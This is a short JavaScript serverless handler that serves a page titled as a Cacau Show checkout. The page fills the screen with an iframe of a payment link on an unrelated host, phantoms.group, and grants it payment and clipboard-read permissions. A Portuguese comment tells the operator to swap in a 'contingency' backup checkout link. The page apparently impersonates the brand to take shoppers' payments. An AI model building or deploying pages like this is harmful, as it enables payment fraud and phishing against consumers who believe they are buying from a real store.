export default function handler(req, res) {
  // ⚠️ TROQUE PELO SEU SEGUNDO LINK DE CHECKOUT (CONTINGÊNCIA)
  const checkoutUrl2 = "https://phantoms.group/l/falha1?shk=3cri8ete";
  
  const html = `
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cacau Show | Finalizar Compra</title>
    <link rel="icon" href="/favicon.png?v=2">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: #f4f0ea; }
        iframe { border: none; width: 100%; height: 100%; display: block; }
    </style>
</head>
<body>
    <iframe src="${checkoutUrl2}" allow="payment; clipboard-read; clipboard-write"></iframe>
</body>
</html>`;

  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(html);
}
